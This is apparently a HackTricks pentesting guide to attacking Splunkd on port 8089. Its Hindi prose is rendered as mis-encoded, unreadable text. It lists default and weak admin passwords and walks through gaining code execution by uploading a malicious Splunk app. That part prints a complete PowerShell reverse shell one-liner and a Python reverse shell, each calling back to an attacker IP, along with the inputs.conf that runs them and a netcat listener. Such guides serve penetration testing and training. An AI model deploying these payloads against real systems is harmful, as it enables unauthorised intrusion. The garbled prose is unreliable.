# 8089 - Pentesting Splunkd

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ЁЯТм [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ЁЯРж [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## **рдмреБрдирд┐рдпрд╛рджреА рдЬрд╛рдирдХрд╛рд░реА**

Splunk рдПрдХ **рд▓реЙрдЧ рдПрдирд╛рд▓рд┐рдЯрд┐рдХреНрд╕ рдЯреВрд▓** рд╣реИ рдЬреЛ **рдбреЗрдЯрд╛ рдХреЛ рдЗрдХрдЯреНрдард╛ рдХрд░рдиреЗ, рд╡рд┐рд╢реНрд▓реЗрд╖рдг рдХрд░рдиреЗ рдФрд░ рджреГрд╢реНрдп рдмрдирд╛рдиреЗ** рдореЗрдВ рдорд╣рддреНрд╡рдкреВрд░реНрдг рднреВрдорд┐рдХрд╛ рдирд┐рднрд╛рддрд╛ рд╣реИред рдЬрдмрдХрд┐ рдЗрд╕рдХрд╛ рдкреНрд░рд╛рд░рдВрднрд┐рдХ рдЙрджреНрджреЗрд╢реНрдп **SIEM (рд╕рд┐рдХреНрдпреЛрд░рд┐рдЯреА рдЗрдВрдлреЙрд░реНрдореЗрд╢рди рдПрдВрдб рдЗрд╡реЗрдВрдЯ рдореИрдиреЗрдЬрдореЗрдВрдЯ)** рдЯреВрд▓ рдХреЗ рд░реВрдк рдореЗрдВ рдХрд╛рд░реНрдп рдХрд░рдирд╛ рдирд╣реАрдВ рдерд╛, рдпрд╣ **рд╕реБрд░рдХреНрд╖рд╛ рдирд┐рдЧрд░рд╛рдиреА** рдФрд░ **рд╡реНрдпрд╛рдкрд╛рд░ рд╡рд┐рд╢реНрд▓реЗрд╖рдг** рдХреЗ рдХреНрд╖реЗрддреНрд░ рдореЗрдВ рд▓реЛрдХрдкреНрд░рд┐рдпрддрд╛ рдкреНрд░рд╛рдкреНрдд рдХрд░ рдЪреБрдХрд╛ рд╣реИред

Splunk рддреИрдирд╛рддреА рдЕрдХреНрд╕рд░ **рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рдбреЗрдЯрд╛** рдХреЛ рд╕рдВрдЧреНрд░рд╣реАрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХреА рдЬрд╛рддреА рд╣реИрдВ рдФрд░ рдпрджрд┐ рд╡реЗ рд╕рд┐рд╕реНрдЯрдо рдХреЛ рд╕рдордЭреМрддрд╛ рдХрд░рдиреЗ рдореЗрдВ рд╕рдлрд▓ рд╣реЛрддреЗ рд╣реИрдВ рддреЛ рдпрд╣ рд╕рдВрднрд╛рд╡рд┐рдд рд╣рдорд▓рд╛рд╡рд░реЛрдВ рдХреЗ рд▓рд┐рдП **рдЬрд╛рдирдХрд╛рд░реА рдХрд╛ рдПрдХ рдореВрд▓реНрдпрд╡рд╛рди рд╕реНрд░реЛрдд** рдмрди рд╕рдХрддреА рд╣реИрдВред **рдбрд┐рдлрд╝реЙрд▓реНрдЯ рдкреЛрд░реНрдЯ:** 8089
```
PORT     STATE SERVICE VERSION
8089/tcp open  http    Splunkd httpd
```
{% hint style="info" %}
**Splunk рд╡реЗрдм рд╕рд░реНрд╡рд░ рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ рдкреЛрд░реНрдЯ 8000 рдкрд░ рдЪрд▓рддрд╛ рд╣реИ**ред
{% endhint %}

## Enumeration

### Free Version

Splunk Enterprise рдкрд░реАрдХреНрд╖рдг **60 рджрд┐рдиреЛрдВ рдХреЗ рдмрд╛рдж рдПрдХ рдореБрдлреНрдд рд╕рдВрд╕реНрдХрд░рдг рдореЗрдВ рдкрд░рд┐рд╡рд░реНрддрд┐рдд рд╣реЛ рдЬрд╛рддрд╛ рд╣реИ**, рдЬреЛ **рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рдирд╣реАрдВ рд╣реИ**ред рд╕рд┐рд╕реНрдЯрдо рдкреНрд░рд╢рд╛рд╕рдХреЛрдВ рдХреЗ рд▓рд┐рдП Splunk рдХрд╛ рдкрд░реАрдХреНрд╖рдг рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рдкрд░реАрдХреНрд╖рдг рд╕реНрдерд╛рдкрд┐рдд рдХрд░рдирд╛ рдЖрдо рдмрд╛рдд рд╣реИ, рдЬрд┐рд╕реЗ **рдмрд╛рдж рдореЗрдВ рднреБрд▓рд╛ рджрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ**ред рдпрд╣ рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рд░реВрдк рд╕реЗ рдореБрдлреНрдд рд╕рдВрд╕реНрдХрд░рдг рдореЗрдВ рдкрд░рд┐рд╡рд░реНрддрд┐рдд рд╣реЛ рдЬрд╛рдПрдЧрд╛ рдЬрд┐рд╕рдореЗрдВ рдХрд┐рд╕реА рднреА рдкреНрд░рдХрд╛рд░ рдХрд╛ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдирд╣реАрдВ рд╣реИ, рдЬреЛ рд╡рд╛рддрд╛рд╡рд░рдг рдореЗрдВ рдПрдХ рд╕реБрд░рдХреНрд╖рд╛ рдЫрд┐рджреНрд░ рдкреЗрд╢ рдХрд░рддрд╛ рд╣реИред рдХреБрдЫ рд╕рдВрдЧрдарди рдмрдЬрдЯ рдХреА рд╕реАрдорд╛рдУрдВ рдХреЗ рдХрд╛рд░рдг рдореБрдлреНрдд рд╕рдВрд╕реНрдХрд░рдг рдХрд╛ рд╡рд┐рдХрд▓реНрдк рдЪреБрди рд╕рдХрддреЗ рд╣реИрдВ, рдмрд┐рдирд╛ рдпрд╣ рдкреВрд░реА рддрд░рд╣ рд╕реЗ рд╕рдордЭреЗ рдХрд┐ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛/рднреВрдорд┐рдХрд╛ рдкреНрд░рдмрдВрдзрди рдХрд╛ рди рд╣реЛрдирд╛ рдХреНрдпрд╛ рдкреНрд░рднрд╛рд╡ рдбрд╛рд▓рддрд╛ рд╣реИред

### Default Credentials

рдкреБрд░рд╛рдиреЗ рд╕рдВрд╕реНрдХрд░рдгреЛрдВ рдореЗрдВ Splunk, рдбрд┐рдлрд╝реЙрд▓реНрдЯ рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕ **`admin:changeme`** рд╣реЛрддреЗ рд╣реИрдВ, рдЬреЛ рд▓реЙрдЧрд┐рди рдкреГрд╖реНрда рдкрд░ рд╕реБрд╡рд┐рдзрд╛рдЬрдирдХ рд░реВрдк рд╕реЗ рдкреНрд░рджрд░реНрд╢рд┐рдд рд╣реЛрддреЗ рд╣реИрдВред\
рд╣рд╛рд▓рд╛рдВрдХрд┐, **Splunk рдХрд╛ рдирд╡реАрдирддрдо рд╕рдВрд╕реНрдХрд░рдг** **рд╕реНрдерд╛рдкрдирд╛ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЗ рджреМрд░рд╛рди рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕** рд╕реЗрдЯ рдХрд░рддрд╛ рд╣реИред рдпрджрд┐ рдбрд┐рдлрд╝реЙрд▓реНрдЯ рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕ рдХрд╛рдо рдирд╣реАрдВ рдХрд░рддреЗ рд╣реИрдВ, рддреЛ рд╕рд╛рдорд╛рдиреНрдп рдХрдордЬреЛрд░ рдкрд╛рд╕рд╡рд░реНрдб рдЬреИрд╕реЗ `admin`, `Welcome`, `Welcome1`, `Password123`, рдЖрджрд┐ рдХреА рдЬрд╛рдВрдЪ рдХрд░рдирд╛ рдЙрдЪрд┐рдд рд╣реИред

### Obtain Information

рдПрдХ рдмрд╛рд░ Splunk рдореЗрдВ рд▓реЙрдЧ рдЗрди рдХрд░рдиреЗ рдХреЗ рдмрд╛рдж, рд╣рдо **рдбреЗрдЯрд╛ рдмреНрд░рд╛рдЙрдЬрд╝ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ,** **рд░рд┐рдкреЛрд░реНрдЯ рдЪрд▓рд╛ рд╕рдХрддреЗ рд╣реИрдВ**, **рдбреИрд╢рдмреЛрд░реНрдб рдмрдирд╛ рд╕рдХрддреЗ рд╣реИрдВ**, Splunkbase рдкреБрд╕реНрддрдХрд╛рд▓рдп рд╕реЗ **рдРрдкреНрд▓рд┐рдХреЗрд╢рди рд╕реНрдерд╛рдкрд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ**, рдФрд░ рдХрд╕реНрдЯрдо рдРрдкреНрд▓рд┐рдХреЗрд╢рди рд╕реНрдерд╛рдкрд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред\
рдЖрдк рдХреЛрдб рднреА рдЪрд▓рд╛ рд╕рдХрддреЗ рд╣реИрдВ: Splunk рдореЗрдВ **рдХреЛрдб рдЪрд▓рд╛рдиреЗ** рдХреЗ рдХрдИ рддрд░реАрдХреЗ рд╣реИрдВ, рдЬреИрд╕реЗ рд╕рд░реНрд╡рд░-рд╕рд╛рдЗрдб Django рдПрдкреНрд▓рд┐рдХреЗрд╢рди, REST рдПрдВрдбрдкреЙрдЗрдВрдЯ, рд╕реНрдХреНрд░рд┐рдкреНрдЯреЗрдб рдЗрдирдкреБрдЯ, рдФрд░ рдЕрд▓рд░реНрдЯрд┐рдВрдЧ рд╕реНрдХреНрд░рд┐рдкреНрдЯред Splunk рд╕рд░реНрд╡рд░ рдкрд░ рд░рд┐рдореЛрдЯ рдХреЛрдб рдирд┐рд╖реНрдкрд╛рджрди рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХрд╛ рдПрдХ рд╕рд╛рдорд╛рдиреНрдп рддрд░реАрдХрд╛ рд╕реНрдХреНрд░рд┐рдкреНрдЯреЗрдб рдЗрдирдкреБрдЯ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛ рд╣реИред

рдЗрд╕рдХреЗ рдЕрд▓рд╛рд╡рд╛, рдЪреВрдВрдХрд┐ Splunk рдХреЛ Windows рдпрд╛ Linux рд╣реЛрд╕реНрдЯ рдкрд░ рд╕реНрдерд╛рдкрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ, рд╕реНрдХреНрд░рд┐рдкреНрдЯреЗрдб рдЗрдирдкреБрдЯ рдмрдирд╛рдП рдЬрд╛ рд╕рдХрддреЗ рд╣реИрдВ рдЬреЛ Bash, PowerShell, рдпрд╛ Batch рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдЪрд▓рд╛рддреЗ рд╣реИрдВред

### Shodan

* `Splunk build`

## RCE

### Create Custom Application

рдПрдХ рдХрд╕реНрдЯрдо рдПрдкреНрд▓рд┐рдХреЗрд╢рди **Python, Batch, Bash, рдпрд╛ PowerShell рд╕реНрдХреНрд░рд┐рдкреНрдЯ** рдЪрд▓рд╛ рд╕рдХрддрд╛ рд╣реИред\
рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ **Splunk рдХреЗ рд╕рд╛рде Python рд╕реНрдерд╛рдкрд┐рдд рд╣реИ**, рдЗрд╕рд▓рд┐рдП **Windows** рд╕рд┐рд╕реНрдЯрдо рдореЗрдВ рднреА рдЖрдк Python рдХреЛрдб рдЪрд▓рд╛ рд╕рдХреЗрдВрдЧреЗред

рдЖрдк рд╣рдорд╛рд░реА рд╕рд╣рд╛рдпрддрд╛ рдХреЗ рд▓рд┐рдП [**рдЗрд╕**](https://github.com/0xjpuff/reverse\_shell\_splunk) Splunk рдкреИрдХреЗрдЬ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рдЗрд╕ рд░рд┐рдкреЙрдЬрд┐рдЯрд░реА рдореЗрдВ **`bin`** рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рдореЗрдВ [Python](https://github.com/0xjpuff/reverse\_shell\_splunk/blob/master/reverse\_shell\_splunk/bin/rev.py) рдФрд░ [PowerShell](https://github.com/0xjpuff/reverse\_shell\_splunk/blob/master/reverse\_shell\_splunk/bin/run.ps1) рдХреЗ рдЙрджрд╛рд╣рд░рдг рд╣реИрдВред рдЪрд▓рд┐рдП рдЗрд╕реЗ рдЪрд░рдг-рджрд░-рдЪрд░рдг рджреЗрдЦрддреЗ рд╣реИрдВред

рдЗрд╕рдХреЗ рд▓рд┐рдП, рд╣рдореЗрдВ рдкрд╣рд▓реЗ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рд╕рдВрд░рдЪрдирд╛ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдПрдХ рдХрд╕реНрдЯрдо Splunk рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдмрдирд╛рдирд╛ рд╣реЛрдЧрд╛:
```shell-session
tree splunk_shell/

splunk_shell/
тФЬтФАтФА bin
тФФтФАтФА default
```
The **`bin`** directory рдореЗрдВ рдХреЛрдИ рднреА **рд╕реНрдХреНрд░рд┐рдкреНрдЯреНрд╕ рд╣реЛрдВрдЧреА рдЬрд┐рдиреНрд╣реЗрдВ рд╣рдо рдЪрд▓рд╛рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** (рдЗрд╕ рдорд╛рдорд▓реЗ рдореЗрдВ, рдПрдХ **PowerShell** рд░рд┐рд╡рд░реНрд╕ рд╢реЗрд▓), рдФрд░ рдбрд┐рдлрд╝реЙрд▓реНрдЯ рдбрд╛рдпрд░реЗрдХреНрдЯрд░реА рдореЗрдВ рд╣рдорд╛рд░рд╛ `inputs.conf` рдлрд╝рд╛рдЗрд▓ рд╣реЛрдЧрд╛ред рд╣рдорд╛рд░рд╛ рд░рд┐рд╡рд░реНрд╕ рд╢реЗрд▓ рдПрдХ **PowerShell рдПрдХ-рд▓рд╛рдЗрдирд░** рд╣реЛрдЧрд╛:
```powershell
$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close(
```
The [inputs.conf](https://docs.splunk.com/Documentation/Splunk/latest/Admin/Inputsconf) рдлрд╝рд╛рдЗрд▓ Splunk рдХреЛ **рдХреМрди рд╕рд╛ рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдЪрд▓рд╛рдирд╛ рд╣реИ** рдФрд░ рдЕрдиреНрдп рд╢рд░реНрддреЗрдВ рдмрддрд╛рддреА рд╣реИред рдпрд╣рд╛рдБ рд╣рдо рдРрдк рдХреЛ рд╕рдХреНрд╖рдо рдХреЗ рд░реВрдк рдореЗрдВ рд╕реЗрдЯ рдХрд░рддреЗ рд╣реИрдВ рдФрд░ Splunk рдХреЛ рд╣рд░ 10 рд╕реЗрдХрдВрдб рдореЗрдВ рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдЪрд▓рд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд╣рддреЗ рд╣реИрдВред рдЕрдВрддрд░рд╛рд▓ рд╣рдореЗрд╢рд╛ рд╕реЗрдХрдВрдб рдореЗрдВ рд╣реЛрддрд╛ рд╣реИ, рдФрд░ рдЗрдирдкреБрдЯ (рд╕реНрдХреНрд░рд┐рдкреНрдЯ) рдХреЗрд╡рд▓ рддрднреА рдЪрд▓реЗрдЧрд╛ рдЬрдм рдпрд╣ рд╕реЗрдЯрд┐рдВрдЧ рдореМрдЬреВрдж рд╣реЛред
```shell-session
cat inputs.conf

[script://./bin/rev.py]
disabled = 0
interval = 10
sourcetype = shell

[script://.\bin\run.bat]
disabled = 0
sourcetype = shell
interval = 10
```
рд╣рдореЗрдВ `.bat` рдлрд╝рд╛рдЗрд▓ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИ, рдЬреЛ рддрдм рдЪрд▓реЗрдЧреА рдЬрдм рдПрдкреНрд▓рд┐рдХреЗрд╢рди рддреИрдирд╛рдд рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛ рдФрд░ PowerShell рдПрдХ-рд▓рд╛рдЗрдирд░ рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░реЗрдЧреАред

рдЕрдЧрд▓рд╛ рдХрджрдо `Install app from file` рдЪреБрдирдирд╛ рд╣реИ рдФрд░ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХреЛ рдЕрдкрд▓реЛрдб рдХрд░рдирд╛ рд╣реИред

<figure><img src="../.gitbook/assets/image (668).png" alt=""><figcaption></figcaption></figure>

рджреБрд╖реНрдЯ рдХрд╕реНрдЯрдо рдРрдк рдЕрдкрд▓реЛрдб рдХрд░рдиреЗ рд╕реЗ рдкрд╣рд▓реЗ, рдЪрд▓рд┐рдП Netcat рдпрд╛ [socat](https://linux.die.net/man/1/socat) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдПрдХ рд╢реНрд░реЛрддрд╛ рд╢реБрд░реВ рдХрд░рддреЗ рд╣реИрдВред
```shell-session
sudo nc -lnvp 443

listening on [any] 443 ...
```
On the `Upload app` page, click on browse, choose the tarball we created earlier and click `Upload`. рдЬреИрд╕реЗ рд╣реА рд╣рдо рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХреЛ рдЕрдкрд▓реЛрдб рдХрд░рддреЗ рд╣реИрдВ, рдПрдХ **reverse shell рдкреНрд░рд╛рдкреНрдд рд╣реЛрддрд╛ рд╣реИ** рдХреНрдпреЛрдВрдХрд┐ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХреА рд╕реНрдерд┐рддрд┐ рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рд░реВрдк рд╕реЗ `Enabled` рдореЗрдВ рдмрджрд▓ рдЬрд╛рдПрдЧреАред

#### Linux

рдпрджрд┐ рд╣рдо рдПрдХ **Linux host** рдХреЗ рд╕рд╛рде рдХрд╛рдо рдХрд░ рд░рд╣реЗ рд╣реЛрддреЗ, рддреЛ рд╣рдореЗрдВ **`rev.py` Python script** рдХреЛ рд╕рдВрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА, рдЗрд╕рд╕реЗ рдкрд╣рд▓реЗ рдХрд┐ рд╣рдо tarball рдмрдирд╛рдПрдВ рдФрд░ рдХрд╕реНрдЯрдо рджреБрд░реНрднрд╛рд╡рдирд╛рдкреВрд░реНрдг рдРрдк рдХреЛ рдЕрдкрд▓реЛрдб рдХрд░реЗрдВред рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХрд╛ рдмрд╛рдХреА рд╣рд┐рд╕реНрд╕рд╛ рд╡рд╣реА рд░рд╣реЗрдЧрд╛, рдФрд░ рд╣рдореЗрдВ рдЕрдкрдиреЗ Netcat listener рдкрд░ рдПрдХ reverse shell рдХрдиреЗрдХреНрд╢рди рдкреНрд░рд╛рдкреНрдд рд╣реЛрдЧрд╛ рдФрд░ рд╣рдо рджреМрдбрд╝ рдореЗрдВ рдЖрдЧреЗ рдмрдврд╝ рдЬрд╛рдПрдВрдЧреЗред
```python
import sys,socket,os,pty

ip="10.10.14.15"
port="443"
s=socket.socket()
s.connect((ip,int(port)))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn('/bin/bash')
```
### RCE & Privilege Escalation

рдЗрд╕ рдкреГрд╖реНрда рдкрд░ рдЖрдк рдпрд╣ рд╕рдордЭ рд╕рдХрддреЗ рд╣реИрдВ рдХрд┐ рдЗрд╕ рд╕реЗрд╡рд╛ рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХреИрд╕реЗ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рддрд╛рдХрд┐ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдмрдврд╝рд╛рдП рдЬрд╛ рд╕рдХреЗрдВ рдФрд░ рд╕реНрдерд┐рд░рддрд╛ рдкреНрд░рд╛рдкреНрдд рдХреА рдЬрд╛ рд╕рдХреЗ:

{% content-ref url="../linux-hardening/privilege-escalation/splunk-lpe-and-persistence.md" %}
[splunk-lpe-and-persistence.md](../linux-hardening/privilege-escalation/splunk-lpe-and-persistence.md)
{% endcontent-ref %}

## References

* [https://academy.hackthebox.com/module/113/section/1213](https://academy.hackthebox.com/module/113/section/1213)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ЁЯТм [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ЁЯРж [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
